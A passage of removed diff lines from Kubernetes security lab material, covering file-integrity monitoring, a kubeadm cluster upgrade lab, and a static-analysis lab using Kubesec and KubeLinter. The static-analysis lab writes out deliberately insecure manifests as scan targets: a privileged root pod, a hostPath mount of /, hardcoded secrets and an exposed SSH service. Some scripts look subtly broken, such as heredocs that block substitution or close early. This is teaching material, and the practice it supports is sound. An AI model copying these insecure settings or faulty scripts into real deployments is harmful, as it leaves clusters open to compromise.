-    
-    if [ -z "$changes" ]; then
-        echo "✅ No integrity violations detected in $pod_name"
-    else
-        echo "🚨 INTEGRITY VIOLATION DETECTED in $pod_name:"
-        echo "$changes"
-        echo ""
-        echo "Detailed analysis:"
-        echo "Files added/modified:"
-        diff "$baseline_file" "$current_checksums" | grep "^>" | cut -d' ' -f3-
-        echo "Files removed:"
-        diff "$baseline_file" "$current_checksums" | grep "^<" | cut -d' ' -f3-
-    fi
-    
-    rm -f "$current_checksums"
-}
-
-monitor_continuously() {
-    local interval=${1:-30}
-    echo "Starting continuous monitoring (checking every $interval seconds)..."
-    echo "Press Ctrl+C to stop"
-    
-    while true; do
-        echo "=== Integrity Check at $(date) ==="
-        
-        # Check all running pods with our labels
-        for pod in $(kubectl get pods -l app=vulnerable-webapp -o jsonpath='{.items[*].metadata.name}'); do
-            check_integrity $pod
-        done
-        
-        for pod in $(kubectl get pods -l app=immutable-webapp -o jsonpath='{.items[*].metadata.name}'); do
-            check_integrity $pod
-        done
-        
-        echo "Next check in $interval seconds..."
-        sleep $interval
-    done
-}
-
-case "$1" in
-    "baseline")
-        create_baseline $2 $3
-        ;;
-    "check")
-        check_integrity $2 $3
-        ;;
-    "monitor")
-        monitor_continuously $2
-        ;;
-    *)
-        echo "Usage: $0 {baseline|check|monitor} [pod_name] [container_name]"
-        echo "  baseline <pod_name> [container_name] - Create integrity baseline"
-        echo "  check <pod_name> [container_name]    - Check integrity against baseline"
-        echo "  monitor [interval_seconds]           - Continuously monitor all pods"
-        ;;
-esac
-EOF
-
-chmod +x file-integrity-monitor.sh
-
-    Create baselines for our applications:
-
-# Create baseline for vulnerable app
-VULNERABLE_POD=$(kubectl get pods -l app=vulnerable-webapp -o jsonpath='{.items[0].metadata.name}')
-./file-integrity-monitor.sh baseline $VULNERABLE_POD
-
-# Create baseline for immutable app
-IMMUTABLE_POD=$(kubectl get pods -l app=immutable-webapp -o jsonpath='{.items[0].metadata.name}')
-./file-integrity-monitor.sh baseline $IMMUTABLE_POD
-
-    Test integrity monitoring:
-
-# Modify files in vulnerable container
-kubectl exec -it $VULNERABLE_POD -- sh -c "echo 'Modified content' >> /usr/share/nginx/html/index.html"
-
-# Check integrity
-./file-integrity-monitor.sh check $VULNERABLE_POD
-./file-integrity-monitor.sh check $IMMUTABLE_POD
-
-Subtask 4.2: Create Security Dashboard
-
-    Create a simple security dashboard script:
-
-cat > security-dashboard.sh << 'EOF'
-#!/bin/bash
-
-# Security Dashboard for Container Immutability
-clear
-
-show_header() {
-    echo "╔══════════════════════════════════════════════════════════════╗"
-    echo "║              CONTAINER SECURITY DASHBOARD                   ║"
-    echo "║                 Immutability Monitoring                     ║"
-    echo "╚══════════════════════════════════════════════════════════════╝"
-    echo ""
-}
-
-show_pod_status() {
-    echo "📊 POD STATUS OVERVIEW"
-    echo "----------------------------------------"
-    
-    echo "Immutable Web App Pods:"
-    kubectl get pods -l app=immutable-webapp -o custom-columns="NAME:.metadata.name,STATUS:.status.phase,READY:.status.containerStatuses[0].ready,RESTARTS:.status.containerStatuses[0].restartCount" --no-headers | while read line; do
-        echo "  ✓ $line"
-    done
-    
-    echo ""
-    echo "Vulnerable Web App Pods:"
-    kubectl get pods -l app=vulnerable-webapp -o custom-columns="NAME:.metadata.name,STATUS:.status.phase,READY:.status.containerStatuses[0].ready,RESTARTS:.status.containerStatuses[0].restartCount" --no-headers | while read line; do
-        echo "  ⚠️  $line"
-    done
-    echo ""
-}
-
-show_security_policies() {
-    echo "🔒 SECURITY POLICY STATUS"
-    echo "----------------------------------------"
-    
-    # Check read-only root filesystem
-    echo "Read-Only Root Filesystem:"
-    kubectl get pods -l app=immutable-webapp -o jsonpath='{.items[*].spec.containers[*].securityContext.readOnlyRootFilesystem}' | grep -q true && echo "  ✅ Enabled" || echo "  ❌ Disabled"
-    
-    # Check non-root user
-    echo "Non-Root User:"
-    kubectl get pods -l app=immutable-webapp -o jsonpath='{.items[*].spec.containers[*].securityContext.runAsNonRoot}' | grep -q true && echo "  ✅ Enabled" || echo "  ❌ Disabled"
-    
-    # Check privilege escalation
-    echo "Privilege Escalation Prevention:"
-    kubectl get pods -l app=immutable-webapp -o jsonpath='{.items[*].spec.containers[*].securityContext.allowPrivilegeEscalation}' | grep -q false && echo "  ✅ Enabled" || echo "  ❌ Disabled"
-    
-    echo ""
-}
-
-show_recent_alerts() {
-    echo "🚨 RECENT SECURITY ALERTS (Last 10)"
-    echo "----------------------------------------"
-    
-    # Get recent Falco alerts
-    local falco_pod=$(kubectl get pods -l app.kubernetes.io/name=falco -o jsonpath='{.items[0].metadata.name}')
-    if [ ! -z "$falco_pod" ]; then
-        kubectl logs $falco_pod --tail=50 | grep -E "(
-
-
-
-
-
-Lab 18: Upgrade and Patch Management Lab
-Objectives
-
-By the end of this lab, students will be able to:
-
-• Understand the importance of Kubernetes cluster upgrade and patch management • Perform a controlled cluster upgrade using kubeadm • Apply patches to Kubernetes components without causing downtime • Validate cluster functionality after upgrade operations • Implement best practices for maintaining cluster security and stability • Troubleshoot common issues during upgrade processes
-Prerequisites
-
-Before starting this lab, students should have:
-
-• Basic understanding of Kubernetes architecture and components • Familiarity with kubectl command-line tool • Knowledge of Linux command-line operations • Understanding of YAML configuration files • Previous experience with kubeadm cluster setup • Basic networking concepts in Kubernetes
-Lab Environment Setup
-
-Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines for this lab. Simply click Start Lab to access your environment - no need to build your own VM or install additional software.
-
-Your lab environment includes: • Ubuntu 20.04 LTS machines • Pre-installed Docker and containerd • kubeadm, kubelet, and kubectl tools • A functional 3-node Kubernetes cluster (1 control plane, 2 worker nodes)
-Task 1: Prepare for Cluster Upgrade
-Subtask 1.1: Verify Current Cluster Status
-
-First, let's examine the current state of our Kubernetes cluster to understand what we're working with.
-
-    Check cluster nodes and their versions:
-
-kubectl get nodes -o wide
-
-    Verify cluster component versions:
-
-kubectl version --short
-
-    Check the health of cluster components:
-
-kubectl get componentstatuses
-
-    List all pods in system namespaces:
-
-kubectl get pods -n kube-system
-kubectl get pods -n kube-public
-kubectl get pods -n kube-node-lease
-
-    Document current cluster information:
-
-# Save current cluster info to a file for reference
-kubectl cluster-info > cluster-info-before-upgrade.txt
-kubectl get nodes -o yaml > nodes-before-upgrade.yaml
-
-Subtask 1.2: Check Available Upgrade Versions
-
-    Update package repositories:
-
-sudo apt update
-
-    Check available kubeadm versions:
-
-apt list -a kubeadm | head -10
-
-    Determine the next available version:
-
-# Find the latest patch version for your current minor version
-kubeadm version
-sudo kubeadm upgrade plan
-
-Subtask 1.3: Create Backup and Safety Measures
-
-    Backup etcd data (run on control plane node):
-
-# Create backup directory
-sudo mkdir -p /opt/etcd-backup
-
-# Get etcd pod information
-kubectl get pod -n kube-system -l component=etcd
-
-# Create etcd snapshot
-sudo ETCDCTL_API=3 etcdctl snapshot save /opt/etcd-backup/etcd-snapshot-$(date +%Y%m%d-%H%M%S).db \
-  --endpoints=https://127.0.0.1:2379 \
-  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
-  --cert=/etc/kubernetes/pki/etcd/server.crt \
-  --key=/etc/kubernetes/pki/etcd/server.key
-
-    Verify backup integrity:
-
-sudo ETCDCTL_API=3 etcdctl snapshot status /opt/etcd-backup/etcd-snapshot-*.db --write-out=table
-
-    Create configuration backups:
-
-# Backup Kubernetes configuration files
-sudo cp -r /etc/kubernetes /opt/kubernetes-config-backup-$(date +%Y%m%d)
-
-Task 2: Perform Control Plane Upgrade
-Subtask 2.1: Upgrade kubeadm on Control Plane
-
-    Drain the control plane node:
-
-# Replace 'control-plane-node-name' with your actual node name
-kubectl drain <control-plane-node-name> --ignore-daemonsets --delete-emptydir-data
-
-    Upgrade kubeadm package:
-
-# Find the target version (example: 1.28.x-00)
-TARGET_VERSION="1.28.2-00"
-
-# Upgrade kubeadm
-sudo apt-mark unhold kubeadm
-sudo apt-get update
-sudo apt-get install -y kubeadm=$TARGET_VERSION
-sudo apt-mark hold kubeadm
-
-    Verify kubeadm upgrade:
-
-kubeadm version
-
-Subtask 2.2: Plan and Apply Control Plane Upgrade
-
-    Generate upgrade plan:
-
-sudo kubeadm upgrade plan
-
-    Apply the upgrade:
-
-# Apply upgrade to the first control plane node
-sudo kubeadm upgrade apply v1.28.2
-
-    Monitor upgrade progress:
-
-# Watch the upgrade process
-kubectl get pods -n kube-system -w
-
-Subtask 2.3: Upgrade kubelet and kubectl on Control Plane
-
-    Upgrade kubelet and kubectl:
-
-sudo apt-mark unhold kubelet kubectl
-sudo apt-get update
-sudo apt-get install -y kubelet=$TARGET_VERSION kubectl=$TARGET_VERSION
-sudo apt-mark hold kubelet kubectl
-
-    Restart kubelet service:
-
-sudo systemctl daemon-reload
-sudo systemctl restart kubelet
-
-    Uncordon the control plane node:
-
-kubectl uncordon <control-plane-node-name>
-
-    Verify control plane upgrade:
-
-kubectl get nodes
-kubectl version --short
-
-Task 3: Upgrade Worker Nodes
-Subtask 3.1: Upgrade First Worker Node
-
-    Drain the worker node (run from control plane):
-
-kubectl drain <worker-node-1-name> --ignore-daemonsets --delete-emptydir-data
-
-    SSH to the worker node and upgrade kubeadm:
-
-# On worker node
-sudo apt-mark unhold kubeadm
-sudo apt-get update
-sudo apt-get install -y kubeadm=$TARGET_VERSION
-sudo apt-mark hold kubeadm
-
-    Upgrade the node configuration:
-
-# On worker node
-sudo kubeadm upgrade node
-
-    Upgrade kubelet and kubectl:
-
-# On worker node
-sudo apt-mark unhold kubelet kubectl
-sudo apt-get update
-sudo apt-get install -y kubelet=$TARGET_VERSION kubectl=$TARGET_VERSION
-sudo apt-mark hold kubelet kubectl
-
-    Restart kubelet:
-
-# On worker node
-sudo systemctl daemon-reload
-sudo systemctl restart kubelet
-
-    Uncordon the node (run from control plane):
-
-kubectl uncordon <worker-node-1-name>
-
-Subtask 3.2: Upgrade Remaining Worker Nodes
-
-Repeat the same process for each remaining worker node:
-
-    For each worker node, repeat the process:
-
-# Drain node
-kubectl drain <worker-node-name> --ignore-daemonsets --delete-emptydir-data
-
-# SSH to worker node and perform upgrade steps
-# (Same as Subtask 3.1 steps 2-5)
-
-# Uncordon node
-kubectl uncordon <worker-node-name>
-
-    Verify all nodes are upgraded:
-
-kubectl get nodes -o wide
-
-Task 4: Apply Security Patches and Updates
-Subtask 4.1: Update Container Runtime
-
-    Check current containerd version:
-
-containerd --version
-
-    Update containerd (on all nodes):
-
-sudo apt update
-sudo apt upgrade containerd.io
-
-    Restart containerd service:
-
-sudo systemctl restart containerd
-sudo systemctl status containerd
-
-Subtask 4.2: Apply System Security Patches
-
-    Update system packages (on all nodes):
-
-sudo apt update
-sudo apt upgrade -y
-
-    Check for security updates:
-
-sudo apt list --upgradable | grep -i security
-
-    Reboot nodes if kernel updates were applied:
-
-# Check if reboot is required
-if [ -f /var/run/reboot-required ]; then
-    echo "Reboot required"
-    # Schedule maintenance window and reboot
-    sudo reboot
-fi
-
-Subtask 4.3: Update Critical Add-ons
-
-    Update CoreDNS:
-
-# Check current CoreDNS version
-kubectl get deployment coredns -n kube-system -o yaml | grep image:
-
-# Update CoreDNS (if needed)
-kubectl set image deployment/coredns -n kube-system coredns=k8s.gcr.io/coredns/coredns:v1.10.1
-
-    Update kube-proxy:
-
-# Check current kube-proxy version
-kubectl get daemonset kube-proxy -n kube-system -o yaml | grep image:
-
-# Verify kube-proxy is updated automatically with cluster upgrade
-kubectl get pods -n kube-system -l k8s-app=kube-proxy
-
-Task 5: Test Cluster Functionality Post-Upgrade
-Subtask 5.1: Verify Cluster Health
-
-    Check all nodes are ready:
-
-kubectl get nodes
-kubectl describe nodes | grep -E "Name:|Conditions:" -A 5
-
-    Verify system pods are running:
-
-kubectl get pods -n kube-system
-kubectl get pods -n kube-system | grep -v Running
-
-    Test cluster DNS resolution:
-
-# Create a test pod
-kubectl run test-dns --image=busybox --rm -it --restart=Never -- nslookup kubernetes.default
-
-Subtask 5.2: Deploy Test Applications
-
-    Create a test namespace:
-
-kubectl create namespace upgrade-test
-
-    Deploy a test application:
-
-cat << EOF | kubectl apply -f -
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: nginx-test
-  namespace: upgrade-test
-spec:
-  replicas: 3
-  selector:
-    matchLabels:
-      app: nginx-test
-  template:
-    metadata:
-      labels:
-        app: nginx-test
-    spec:
-      containers:
-      - name: nginx
-        image: nginx:latest
-        ports:
-        - containerPort: 80
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: nginx-test-service
-  namespace: upgrade-test
-spec:
-  selector:
-    app: nginx-test
-  ports:
-  - port: 80
-    targetPort: 80
-  type: ClusterIP
-EOF
-
-    Verify deployment:
-
-kubectl get all -n upgrade-test
-kubectl wait --for=condition=available --timeout=300s deployment/nginx-test -n upgrade-test
-
-Subtask 5.3: Test Network Connectivity
-
-    Test pod-to-pod communication:
-
-# Get pod IPs
-kubectl get pods -n upgrade-test -o wide
-
-# Test connectivity between pods
-kubectl exec -n upgrade-test deployment/nginx-test -- curl -s http://<another-pod-ip>
-
-    Test service discovery:
-
-# Test service resolution
-kubectl run test-connectivity --image=busybox --rm -it --restart=Never -n upgrade-test -- wget -qO- http://nginx-test-service
-
-    Test external connectivity:
-
-kubectl run test-external --image=busybox --rm -it --restart=Never -- wget -qO- http://httpbin.org/ip
-
-Subtask 5.4: Performance and Resource Verification
-
-    Check resource usage:
-
-kubectl top nodes
-kubectl top pods -n kube-system
-
-    Verify persistent volumes (if applicable):
-
-kubectl get pv
-kubectl get pvc --all-namespaces
-
-    Test RBAC functionality:
-
-# Create a test service account
-kubectl create serviceaccount test-sa -n upgrade-test
-
-# Test permissions
-kubectl auth can-i get pods --as=system:serviceaccount:upgrade-test:test-sa -n upgrade-test
-
-Task 6: Post-Upgrade Cleanup and Documentation
-Subtask 6.1: Clean Up Test Resources
-
-    Remove test applications:
-
-kubectl delete namespace upgrade-test
-kubectl delete pod test-dns --ignore-not-found
-kubectl delete pod test-connectivity --ignore-not-found
-kubectl delete pod test-external --ignore-not-found
-
-    Clean up temporary files:
-
-rm -f cluster-info-before-upgrade.txt
-rm -f nodes-before-upgrade.yaml
-
-Subtask 6.2: Document Upgrade Results
-
-    Generate post-upgrade cluster information:
-
-# Document final cluster state
-kubectl cluster-info > cluster-info-after-upgrade.txt
-kubectl get nodes -o yaml > nodes-after-upgrade.yaml
-kubectl version --short > version-after-upgrade.txt
-
-    Create upgrade summary:
-
-cat << EOF > upgrade-summary.txt
-Kubernetes Cluster Upgrade Summary
-==================================
-Date: $(date)
-Upgrade performed by: $(whoami)
-
-Pre-upgrade version: [Document from initial check]
-Post-upgrade version: $(kubectl version --short | grep Server)
-
-Nodes upgraded:
-$(kubectl get nodes)
-
-Critical components verified:
-- etcd: Healthy
-- CoreDNS: Running
-- kube-proxy: Running
-- Container runtime: Updated
-
-Tests performed:
-- DNS resolution: PASSED
-- Pod deployment: PASSED
-- Service connectivity: PASSED
-- External connectivity: PASSED
-
-Backup location: /opt/etcd-backup/
-Configuration backup: /opt/kubernetes-config-backup-*
-EOF
-
-Troubleshooting Common Issues
-Issue 1: Node Fails to Upgrade
-
-Symptoms: Node remains in NotReady state after upgrade
-
-Solution:
-
-# Check kubelet logs
-sudo journalctl -u kubelet -f
-
-# Restart kubelet service
-sudo systemctl restart kubelet
-
-# Check node conditions
-kubectl describe node <node-name>
-
-Issue 2: Pods Stuck in Pending State
-
-Symptoms: Pods cannot be scheduled after upgrade
-
-Solution:
-
-# Check node taints
-kubectl describe nodes | grep Taints
-
-# Remove upgrade taints if present
-kubectl taint nodes <node-name> node.kubernetes.io/unschedulable-
-
-# Check resource availability
-kubectl describe nodes | grep -A 5 "Allocated resources"
-
-Issue 3: DNS Resolution Failures
-
-Symptoms: Pods cannot resolve service names
-
-Solution:
-
-# Check CoreDNS pods
-kubectl get pods -n kube-system -l k8s-app=kube-dns
-
-# Restart CoreDNS
-kubectl rollout restart deployment/coredns -n kube-system
-
-# Verify DNS configuration
-kubectl get configmap coredns -n kube-system -o yaml
-
-Security Best Practices
-During Upgrades
-
-• Always backup etcd before starting any upgrade process • Test upgrades in staging environment first • Maintain node cordoning during individual node upgrades • Monitor security advisories for Kubernetes components • Verify RBAC policies remain intact after upgrades
-Post-Upgrade Security Checks
-
-# Check for deprecated API usage
-kubectl get events --all-namespaces | grep -i deprecated
-
-# Verify security policies
-kubectl get networkpolicies --all-namespaces
-kubectl get podsecuritypolicies
-
-# Check for security updates
-kubectl get nodes -o json | jq '.items[].status.nodeInfo'
-
-Conclusion
-
-In this comprehensive lab, you have successfully:
-
-• Performed a complete Kubernetes cluster upgrade using kubeadm, ensuring minimal downtime and maintaining cluster functionality • Applied security patches to both Kubernetes components and underlying system packages • Implemented proper backup procedures to protect against upgrade failures • Validated cluster functionality through comprehensive testing of networking, DNS, and application deployment • Learned troubleshooting techniques for common upgrade issues
-
-Why This Matters: Keeping Kubernetes clusters up-to-date is critical for security, stability, and access to new features. The skills you've developed in this lab are essential for maintaining production Kubernetes environments, ensuring they remain secure against vulnerabilities while providing reliable service to applications and users.
-
-The upgrade and patch management processes you've mastered are fundamental responsibilities for Kubernetes administrators and are crucial knowledge areas for the Certified Kubernetes Security Specialist (CKS) certification. Regular maintenance of Kubernetes clusters helps prevent security breaches, ensures optimal performance, and maintains compliance with organizational security policies.
-
-Remember to always test upgrade procedures in non-production environments first, maintain regular backup schedules, and stay informed about security advisories affecting your Kubernetes infrastructure.
-
-
-
-
-Lab 19: Static Analysis in CI/CD Pipelines
-Objectives
-
-By the end of this lab, you will be able to:
-
-• Configure a CI/CD pipeline using GitHub Actions to integrate static analysis tools • Implement Kubesec for Kubernetes security analysis in automated workflows • Deploy KubeLinter to detect configuration issues and security vulnerabilities • Set up automated scanning for container images from trusted registries • Identify and remediate common Kubernetes misconfigurations • Create security gates in CI/CD pipelines to prevent insecure deployments • Understand the importance of shift-left security practices in DevSecOps
-Prerequisites
-
-Before starting this lab, you should have:
-
-• Basic understanding of Kubernetes concepts (pods, deployments, services) • Familiarity with YAML syntax and Kubernetes manifest files • Basic knowledge of Git and GitHub workflows • Understanding of CI/CD pipeline concepts • Experience with command-line interface operations • Basic Docker and container concepts
-Lab Environment Setup
-
-Ready-to-Use Cloud Machines: Al Nafi provides Linux-based cloud machines with all necessary tools pre-installed. Simply click Start Lab to access your environment. No need to build your own VM or install additional software.
-
-Your lab environment includes: • Ubuntu 20.04 LTS with Docker pre-installed • kubectl configured and ready to use • Git client configured • Access to create GitHub repositories • All required static analysis tools
-Task 1: Environment Preparation and Tool Installation
-Subtask 1.1: Verify Lab Environment
-
-First, let's verify that our lab environment is properly configured.
-
-# Check Docker installation
-docker --version
-
-# Check kubectl installation
-kubectl version --client
-
-# Check Git configuration
-git --version
-
-# Verify system resources
-free -h
-df -h
-
-Subtask 1.2: Install Static Analysis Tools
-
-Install Kubesec and KubeLinter on your local environment.
-
-# Install Kubesec
-curl -sSX GET https://api.github.com/repos/controlplaneio/kubesec/releases/latest \
-  | grep browser_download_url \
-  | grep linux \
-  | cut -d '"' -f 4 \
-  | wget -O kubesec -i -
-
-chmod +x kubesec
-sudo mv kubesec /usr/local/bin/
-
-# Verify Kubesec installation
-kubesec version
-
-# Install KubeLinter
-curl -L https://github.com/stackrox/kube-linter/releases/latest/download/kube-linter-linux.tar.gz \
-  | tar xz
-
-sudo mv kube-linter /usr/local/bin/
-
-# Verify KubeLinter installation
-kube-linter version
-
-Subtask 1.3: Create Project Directory Structure
-
-Set up the project directory structure for our lab.
-
-# Create main project directory
-mkdir -p ~/static-analysis-lab
-cd ~/static-analysis-lab
-
-# Create subdirectories
-mkdir -p {manifests,scripts,.github/workflows,reports}
-
-# Create initial files
-touch README.md
-touch .gitignore
-
-# Set up .gitignore
-cat > .gitignore << 'EOF'
-# Reports and logs
-reports/*.json
-reports/*.html
-*.log
-
-# Temporary files
-*.tmp
-.DS_Store
-
-# IDE files
-.vscode/
-.idea/
-EOF
-
-Task 2: Create Sample Kubernetes Manifests with Security Issues
-Subtask 2.1: Create Insecure Pod Manifest
-
-Create a deliberately insecure pod manifest to demonstrate static analysis capabilities.
-
-# Create an insecure pod manifest
-cat > manifests/insecure-pod.yaml << 'EOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: insecure-app
-  labels:
-    app: insecure-app
-spec:
-  containers:
-  - name: app-container
-    image: nginx:latest
-    ports:
-    - containerPort: 80
-    securityContext:
-      privileged: true
-      runAsUser: 0
-    env:
-    - name: SECRET_KEY
-      value: "hardcoded-secret-123"
-    resources: {}
-EOF
-
-Subtask 2.2: Create Insecure Deployment Manifest
-
-Create a deployment with multiple security vulnerabilities.
-
-# Create an insecure deployment manifest
-cat > manifests/insecure-deployment.yaml << 'EOF'
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: vulnerable-app
-  labels:
-    app: vulnerable-app
-spec:
-  replicas: 3
-  selector:
-    matchLabels:
-      app: vulnerable-app
-  template:
-    metadata:
-      labels:
-        app: vulnerable-app
-    spec:
-      containers:
-      - name: web-server
-        image: nginx:1.14
-        ports:
-        - containerPort: 80
-        securityContext:
-          allowPrivilegeEscalation: true
-          readOnlyRootFilesystem: false
-        env:
-        - name: DB_PASSWORD
-          value: "admin123"
-        - name: API_KEY
-          value: "sk-1234567890abcdef"
-        volumeMounts:
-        - name: host-volume
-          mountPath: /host
-      volumes:
-      - name: host-volume
-        hostPath:
-          path: /
-          type: Directory
-      serviceAccountName: default
-EOF
-
-Subtask 2.3: Create Service with Security Issues
-
-Create a service manifest with potential security concerns.
-
-# Create a service manifest
-cat > manifests/insecure-service.yaml << 'EOF'
-apiVersion: v1
-kind: Service
-metadata:
-  name: vulnerable-service
-spec:
-  type: NodePort
-  ports:
-  - port: 80
-    targetPort: 80
-    nodePort: 30080
-  selector:
-    app: vulnerable-app
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: admin-service
-spec:
-  type: LoadBalancer
-  ports:
-  - port: 22
-    targetPort: 22
-    protocol: TCP
-  selector:
-    app: admin-app
-EOF
-
-Task 3: Configure Static Analysis Tools
-Subtask 3.1: Test Kubesec Analysis
-
-Run Kubesec analysis on our insecure manifests to understand the tool's capabilities.
-
-# Analyze the insecure pod
-kubesec scan manifests/insecure-pod.yaml
-
-# Analyze the insecure deployment
-kubesec scan manifests/insecure-deployment.yaml
-
-# Generate JSON report for the pod
-kubesec scan manifests/insecure-pod.yaml > reports/kubesec-pod-report.json
-
-# Generate JSON report for the deployment
-kubesec scan manifests/insecure-deployment.yaml > reports/kubesec-deployment-report.json
-
-Subtask 3.2: Configure KubeLinter Analysis
-
-Create a KubeLinter configuration file and run analysis.
-
-# Create KubeLinter configuration
-cat > .kube-linter.yaml << 'EOF'
-checks:
-  # Enable all default checks
-  addAllBuiltIn: true
-  
-  # Disable specific checks if needed (example)
-  exclude:
-    - "dangling-service"
-  
-  # Include additional checks
-  include:
-    - "privileged-ports"
-    - "ssh-port"
-    - "unsafe-sysctls"
-
-# Custom check configurations
-customChecks: []
-
-# Ignore specific files or patterns
-ignore:
-  - "kustomization.yaml"
-EOF
-
-# Run KubeLinter on all manifests
-kube-linter lint manifests/
-
-# Generate detailed report
-kube-linter lint manifests/ --format json > reports/kube-linter-report.json
-
-# Generate human-readable report
-kube-linter lint manifests/ --format plain > reports/kube-linter-report.txt
-
-Subtask 3.3: Create Analysis Scripts
-
-Create reusable scripts for static analysis.
-
-# Create comprehensive analysis script
-cat > scripts/run-static-analysis.sh << 'EOF'
-#!/bin/bash
-
-set -e
-
-echo "=== Starting Static Analysis ==="
-echo "Timestamp: $(date)"
-
-# Create reports directory if it doesn't exist
-mkdir -p reports
-
-# Run Kubesec analysis
-echo "Running Kubesec analysis..."
-for file in manifests/*.yaml; do
-    if [ -f "$file" ]; then
-        filename=$(basename "$file" .yaml)
-        echo "Analyzing $file..."
-        kubesec scan "$file" > "reports/kubesec-${filename}-report.json"
-        
-        # Extract score for summary
-        score=$(jq -r '.[0].score // "N/A"' "reports/kubesec-${filename}-report.json")
-        echo "  Score: $score"
-    fi
-done
-
-# Run KubeLinter analysis
-echo "Running KubeLinter analysis..."
-kube-linter lint manifests/ --format json > reports/kube-linter-full-report.json
-kube-linter lint manifests/ --format plain > reports/kube-linter-summary.txt
-
-# Generate summary report
-echo "Generating summary report..."
-cat > reports/analysis-summary.md << 'SUMMARY'
-# Static Analysis Summary
-
-## Analysis Date
-$(date)
-
-## Files Analyzed
-$(find manifests/ -name "*.yaml" | wc -l) YAML files
-
-## Kubesec Results
-$(for file in reports/kubesec-*-report.json; do
-    if [ -f "$file" ]; then
-        filename=$(basename "$file" -report.json | sed 's/kubesec-//')
-        score=$(jq -r '.[0].score // "N/A"' "$file")
-        echo "- $filename: Score $score"
-    fi
-done)
-
-## KubeLinter Issues
-$(jq -r '.Reports | length' reports/kube-linter-full-report.json) total issues found
-
-## Critical Issues
-$(jq -r '.Reports[] | select(.Level == "error") | .Check' reports/kube-linter-full-report.json | sort | uniq -c | sort -nr)
-
-SUMMARY
-
-echo "=== Static Analysis Complete ==="
-echo "Reports generated in ./reports/ directory"
-EOF
-
-# Make script executable
-chmod +x scripts/run-static-analysis.sh
-
-# Run the analysis script
-./scripts/run-static-analysis.sh
-
-Task 4: Set Up GitHub Repository and CI/CD Pipeline
-Subtask 4.1: Initialize Git Repository
-
-Set up a Git repository for our project.
-
-# Initialize Git repository
-git init
-
-# Add all files
-git add .
-
-# Create initial commit
-git commit -m "Initial commit: Add insecure Kubernetes manifests and analysis tools"
-
-# Create a GitHub repository (you'll need to do this manually on GitHub.com)
-echo "Please create a new repository on GitHub.com named 'k8s-static-analysis-lab'"
-echo "Then run the following commands with your repository URL:"
-echo "git remote add origin https://github.com/YOUR_USERNAME/k8s-static-analysis-lab.git"
-echo "git branch -M main"
-echo "git push -u origin main"
-
-Subtask 4.2: Create GitHub Actions Workflow
-
-Create a comprehensive CI/CD pipeline with static analysis integration.
-
-# Create GitHub Actions workflow
-cat > .github/workflows/static-analysis.yml << 'EOF'
-name: Kubernetes Static Analysis
-
-on:
-  push:
-    branches: [ main, develop ]
-  pull_request:
-    branches: [ main ]
-  schedule:
-    # Run daily at 2 AM UTC
-    - cron: '0 2 * * *'
-
-jobs:
-  static-analysis:
-    name: Static Security Analysis
-    runs-on: ubuntu-latest
-    
-    steps:
-    - name: Checkout Code
-      uses: actions/checkout@v4
-      
-    - name: Set up Docker
-      uses: docker/setup-buildx-action@v3
-      
-    - name: Install Kubesec
-      run: |
-        curl -sSX GET https://api.github.com/repos/controlplaneio/kubesec/releases/latest \
-          | grep browser_download_url \
-          | grep linux \
-          | cut -d '"' -f 4 \
-          | wget -O kubesec -i -
-        chmod +x kubesec
-        sudo mv kubesec /usr/local/bin/
-        kubesec version
-        
-    - name: Install KubeLinter
-      run: |
-        curl -L https://github.com/stackrox/kube-linter/releases/latest/download/kube-linter-linux.tar.gz \
-          | tar xz
-        sudo mv kube-linter /usr/local/bin/
-        kube-linter version
-        
-    - name: Create Reports Directory
-      run: mkdir -p reports
-      
-    - name: Run Kubesec Analysis
-      run: |
-        echo "Running Kubesec analysis..."
-        for file in manifests/*.yaml; do
-          if [ -f "$file" ]; then
-            filename=$(basename "$file" .yaml)
-            echo "Analyzing $file..."
-            kubesec scan "$file" > "reports/kubesec-${filename}-report.json"
-            
-            # Check if score is below threshold
-            score=$(jq -r '.[0].score // 0' "reports/kubesec-${filename}-report.json")
-            echo "File: $file, Score: $score"
-            
-            if [ "$score" -lt 0 ]; then
-              echo "::error::Security score for $file is $score (below threshold of 0)"
-              echo "KUBESEC_FAILED=true" >> $GITHUB_ENV
-            fi
-          fi
-        done
-        
-    - name: Run KubeLinter Analysis
-      run: |
-        echo "Running KubeLinter analysis..."
-        kube-linter lint manifests/ --format json > reports/kube-linter-report.json || true
-        kube-linter lint manifests/ --format plain > reports/kube-linter-summary.txt || true
-        
-        # Check for critical issues
-        critical_count=$(jq -r '.Reports[] | select(.Level == "error") | .Check' reports/kube-linter-report.json | wc -l)
-        echo "Critical issues found: $critical_count"
-        
-        if [ "$critical_count" -gt 0 ]; then
-          echo "::error::Found $critical_count critical security issues"
-          echo "KUBELINTER_FAILED=true" >> $GITHUB_ENV
-        fi
-        
-    - name: Image Security Scan
-      run: |
-        echo "Scanning container images for vulnerabilities..."
-        
-        # Extract images from manifests
-        images=$(grep -h "image:" manifests/*.yaml | sed 's/.*image: *//' | sort | uniq)
-        
-        for image in $images; do
-          echo "Checking image: $image"
-          
-          # Check if image is from trusted registry
-          if [[ "$image" == *"docker.io"* ]] || [[ "$image" != *"/"* ]]; then
-            echo "::warning::Image $image may not be from a trusted registry"
-          fi
-          
-          # Check for latest tag usage
-          if [[ "$image" == *":latest" ]] || [[ "$image" != *":"* ]]; then
-            echo "::error::Image $image uses 'latest' tag or no tag specified"
-            echo "IMAGE_TAG_FAILED=true" >> $GITHUB_ENV
-          fi
-          
-          # Basic image pull test
-          docker pull "$image" || echo "::warning::Failed to pull image $image"
-        done
-        
-    - name: Generate Security Report
-      run: |
-        cat > reports/security-summary.md << 'EOF'
-        # Security Analysis Report
-        
-        **Analysis Date:** $(date)
-        **Repository:** ${{ github.repository }}
-        **Commit:** ${{ github.sha }}
-        
-        ## Kubesec Results
-        $(for file in reports/kubesec-*-report.json; do
-          if [ -f "$file" ]; then
-            filename=$(basename "$file" -report.json | sed 's/kubesec-//')
-            score=$(jq -r '.[0].score // "N/A"' "$file")
-            echo "- **$filename**: Score $score"
-          fi
-        done)
-        
-        ## KubeLinter Issues
-        **Total Issues:** $(jq -r '.Reports | length' reports/kube-linter-report.json)
-        
-        ### Critical Issues
